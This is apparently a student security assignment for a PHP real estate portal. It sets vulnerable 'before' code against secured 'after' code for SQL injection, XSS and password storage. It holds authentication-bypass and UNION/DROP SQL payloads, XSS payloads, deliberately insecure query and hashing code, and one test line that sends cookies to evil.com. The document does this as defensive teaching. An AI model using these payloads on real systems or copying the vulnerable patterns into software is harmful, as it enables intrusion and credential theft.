# Phase 5.2: Before/After Code Documentation for Three Threats
## CIS324 Real Estate Portal - Student: 241-16-034, Section: 19_A

---

## Threat 1: SQL Injection (SQLi)

### Vulnerability Description
SQL Injection occurs when user input is directly concatenated into SQL queries, allowing attackers to manipulate query logic.

### Before (Vulnerable Code)
```php
// ❌ VULNERABLE - Direct concatenation
public function findByEmail(string $email): ?array
{
    $sql = "SELECT * FROM users WHERE email = '" . $email . "'";
    $result = $this->db->query($sql);
    return $result->fetch_assoc();
}

// ❌ VULNERABLE - In login
public function login(string $email, string $password): bool
{
    $sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
    // Attacker input: email = ' OR '1'='1' --
    // Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = '...'
    // Returns first user (often admin)
}
```

### Attack Payload Examples
| Input Field | Payload | Effect |
|-------------|---------|--------|
| Email | `' OR '1'='1' --` | Bypass authentication |
| Search | `'; DROP TABLE users; --` | Delete table |
| Property ID | `1 UNION SELECT password FROM users` | Extract passwords |

### After (Secured Code)
```php
// ✅ SECURE - Prepared Statements (PDO)
public function findByEmail(string $email): ?array
{
    $sql = "SELECT * FROM `users` WHERE `email` = ?";
    return Database::fetchOne($sql, [$email]);
}

public function verifyPassword(int $id, string $password): bool
{
    $sql = "SELECT `password_hash` FROM `users` WHERE `id` = ?";
    $user = Database::fetchOne($sql, [$id]);
    if (!$user) return false;
    return Security::verifyPassword($password, $user['password_hash']);
}

// ✅ SECURE - All Model queries use prepared statements
// Property search with multiple parameters
public function search(array $filters, int $page, int $perPage): array
{
    $conditions = ["p.`status` = 'approved'"];
    $params = [];
    
    if (!empty($filters['search'])) {
        $search = '%' . $filters['search'] . '%';
        $conditions[] = "(p.`title` LIKE ? OR p.`description` LIKE ? OR p.`address` LIKE ?)";
        $params[] = $search;
        $params[] = $search;
        $params[] = $search;
    }
    
    $whereSql = 'WHERE ' . implode(' AND ', $conditions);
    // ... rest uses prepared statements
}
```

### Database Layer Protection
```php
// app/Core/Database.php - All methods use prepared statements
public static function fetchOne(string $sql, array $params = []): ?array
{
    $stmt = self::getInstance()->prepare($sql);
    $stmt->execute($params);
    return $stmt->fetch() ?: null;
}

public static function execute(string $sql, array $params = []): int
{
    $stmt = self::getInstance()->prepare($sql);
    $stmt->execute($params);
    return $stmt->rowCount();
}
```

### Test Evidence (To Be Executed)
```bash
# Test 1: Authentication Bypass
curl -X POST /login \
  -d "email=' OR '1'='1' --&password=anything"
# Expected: "Invalid email or password" (not logged in)

# Test 2: Search Injection
curl "/api/properties?search=' UNION SELECT 1,2,3--"
# Expected: Empty results or error, no data leak

# Test 3: Property ID Injection
curl "/properties/1' OR '1'='1"
# Expected: 404 Not Found
```

---

## Threat 2: Cross-Site Scripting (XSS)

### Vulnerability Description
XSS occurs when untrusted user input is rendered in HTML without proper escaping, allowing script execution in victims' browsers.

### Before (Vulnerable Code)
```php
// ❌ VULNERABLE - Direct output without escaping
// In property/show.php
<h1><?php echo $property['title']; ?></h1>
<p><?php echo $property['description']; ?></p>

// ❌ VULNERABLE - In inquiry display
<div class="message">
    <?php echo $inquiry['message']; ?>
</div>

// ❌ VULNERABLE - In agent response
<div class="response">
    <?php echo $inquiry['agent_response']; ?>
</div>

// ❌ VULNERABLE - JavaScript context
<script>
    var propertyTitle = '<?php echo $property['title']; ?>';
    var userMessage = '<?php echo $inquiry['message']; ?>';
</script>
```

### Attack Payload Examples
| Context | Payload | Effect |
|---------|---------|--------|
| Property Title | `<img src=x onerror=alert('XSS')>` | Execute on property view |
| Description | `<script>fetch('/api/favourites/toggle',{method:'POST',body:'{"property_id":1}'})</script>` | Auto-favourite |
| Inquiry Message | `<svg onload=stealCookies()>` | Session hijacking |
| Agent Response | `javascript:alert(document.cookie)` | Cookie theft |

### After (Secured Code)
```php
// ✅ SECURE - Context-aware escaping
// app/Config/Security.php
public static function escape(string $value, int $flags = ENT_QUOTES, string $encoding = 'UTF-8'): string
{
    return htmlspecialchars($value, $flags, $encoding);
}

// In Views - HTML Context
<h1><?= Security::escape($property['title']) ?></h1>
<p><?= Security::escape($property['description']) ?></p>

// In Views - HTML Attribute Context
<img src="<?= Security::escape($image['file_path']) ?>" 
     alt="<?= Security::escape($property['title']) ?>">

// In Views - JavaScript Context (inside script tag)
<script>
    const propertyTitle = <?= json_encode($property['title'], JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP) ?>;
    const userMessage = <?= json_encode($inquiry['message'], JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP) ?>;
</script>

// In Views - URL Context
<a href="/properties/<?= urlencode($property['id']) ?>">
```

### Content Security Policy (Additional Layer)
```php
// app/Core/Response.php
public static function setSecurityHeaders(): void
{
    $csp = "default-src 'self'; " .
           "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; " .
           "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; " .
           "img-src 'self' data: https:; " .
           "font-src 'self' https://cdn.jsdelivr.net; " .
           "connect-src 'self'; " .
           "frame-ancestors 'none';";
    header("Content-Security-Policy: {$csp}");
    
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: DENY');
    header('X-XSS-Protection: 1; mode=block');
}
```

### Test Evidence (To Be Executed)
```bash
# Test 1: Property Title XSS
# Create property with title: <script>alert('XSS')</script>
# Visit /properties/{id}
# Expected: Title displayed as text, not executed

# Test 2: Inquiry Message XSS
# Submit inquiry with message: <img src=x onerror=alert(1)>
# Agent views inquiry
# Expected: Message displayed as text

# Test 3: Search XSS
curl "/properties?search=<script>alert(1)</script>"
# Expected: Search term displayed safely in results

# Test 4: CSP Blocks Inline Scripts
# Try to inject: <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
# Expected: CSP blocks execution, console shows violation
```

---

## Threat 3: Weak Password Storage

### Vulnerability Description
Storing passwords in plain text, using weak hashes (MD5, SHA1), or unsalted hashes allows attackers to easily crack passwords if database is compromised.

### Before (Vulnerable Code)
```php
// ❌ VULNERABLE - Plain text storage
public function createUser(array $data): int
{
    $sql = "INSERT INTO users (email, password) VALUES ('{$data['email']}', '{$data['password']}')";
    return $this->db->query($sql);
}

// ❌ VULNERABLE - MD5 (fast, no salt)
public function createUser(array $data): int
{
    $hash = md5($data['password']); // 100M+ hashes/sec on GPU
    $sql = "INSERT INTO users (email, password) VALUES (?, ?)";
    return $this->db->execute($sql, [$data['email'], $hash]);
}

// ❌ VULNERABLE - SHA1 (fast, no salt)
$hash = sha1($data['password']);

// ❌ VULNERABLE - Unsalted hash
$hash = hash('sha256', $data['password']); // Rainbow table vulnerable

// ❌ VULNERABLE - Timing attack vulnerable comparison
if ($inputHash === $storedHash) { // String comparison stops at first difference
    return true;
}
```

### Attack Scenarios
| Attack | Method | Time to Crack (8-char password) |
|--------|--------|--------------------------------|
| Plain Text | Read database | Instant |
| MD5 | Rainbow tables / GPU | < 1 second |
| SHA1 | GPU brute force | < 1 minute |
| Unsalted SHA256 | Rainbow tables | Minutes |
| Salted SHA256 (1 round) | GPU | Hours |
| **Argon2id (64MB, 4 iterations)** | **GPU/ASIC** | **Years** |

### After (Secured Code)
```php
// ✅ SECURE - Argon2id with high memory cost
// app/Config/Security.php
public static function hashPassword(string $password): string
{
    return password_hash($password, PASSWORD_ARGON2ID, [
        'memory_cost' => 65536,    // 64 MB RAM per hash
        'time_cost' => 4,          // 4 iterations
        'threads' => 3,            // 3 parallel threads
    ]);
}

public static function verifyPassword(string $password, string $hash): bool
{
    return password_verify($password, $hash);
}

public static function needsRehash(string $hash): bool
{
    return password_needs_rehash($hash, PASSWORD_ARGON2ID, [
        'memory_cost' => 65536,
        'time_cost' => 4,
        'threads' => 3,
    ]);
}

// Constant-time comparison (prevents timing attacks)
public static function hashEquals(string $known, string $user): bool
{
    return hash_equals($known, $user);
}

// app/Model/User.php
public function createUser(array $data): int
{
    if (isset($data['password'])) {
        $data['password_hash'] = Security::hashPassword($data['password']);
        unset($data['password']);
    }
    return $this->create($data);
}

public function verifyPassword(int $id, string $password): bool
{
    $user = $this->find($id);
    if (!$user) return false;
    return Security::verifyPassword($password, $user['password_hash']);
}

// Auto-upgrade on login if better algorithm available
public function login(array $user): void
{
    if (Security::needsRehash($user['password_hash'])) {
        $newHash = Security::hashPassword($user['password']); // Need plain password
        // Would need to rehash on successful verify
    }
}
```

### Database Schema Protection
```sql
-- password_hash column stores Argon2id hash (97 chars)
`password_hash` VARCHAR(255) NOT NULL

-- Example hash format:
-- $argon2id$v=19$m=65536,t=4,p=3$c29tZXNhbHQ$eK8vJ9xL2mN4pQ7rT5wY8zA1bC3dE6fH9iJ2kL5mN8o
--  algorithm  version  memory  time  threads  salt          hash
```

### Test Evidence (To Be Executed)
```bash
# Test 1: Verify Argon2id hash format
# Register user with password: "password123"
# Check database:
SELECT password_hash FROM users WHERE email = 'test@example.com';
# Expected: Starts with $argon2id$v=19$m=65536,t=4,p=3$

# Test 2: Verify password verification works
# Login with correct password
# Expected: Success

# Test 3: Verify wrong password rejected
# Login with wrong password
# Expected: "Invalid email or password"

# Test 4: Timing attack resistance
# Measure response time for valid vs invalid user
# Expected: Similar response times (constant-time)

# Test 5: Hash upgrade detection
# Manually insert old MD5 hash
# Login attempt
# Expected: System detects weak hash (if implemented)
```

---

## Summary Table for Report (Q5)

| Threat | Vulnerable Pattern | Secure Implementation | Files Modified | Test Status |
|--------|-------------------|----------------------|----------------|-------------|
| **SQL Injection** | String concatenation in queries | PDO Prepared Statements with `?` placeholders | `Database.php`, All Models | 🔲 Pending |
| **XSS** | Direct `echo $variable` in HTML | `Security::escape()` + CSP headers | `Security.php`, All Views, `Response.php` | 🔲 Pending |
| **Weak Passwords** | MD5/SHA1/plain text | Argon2id (64MB, 4 iterations) + `hash_equals()` | `Security.php`, `User.php` | 🔲 Pending |

**All three threats documented with Before/After code ✅**
**Test cases defined ✅**
**Ready for execution after database setup**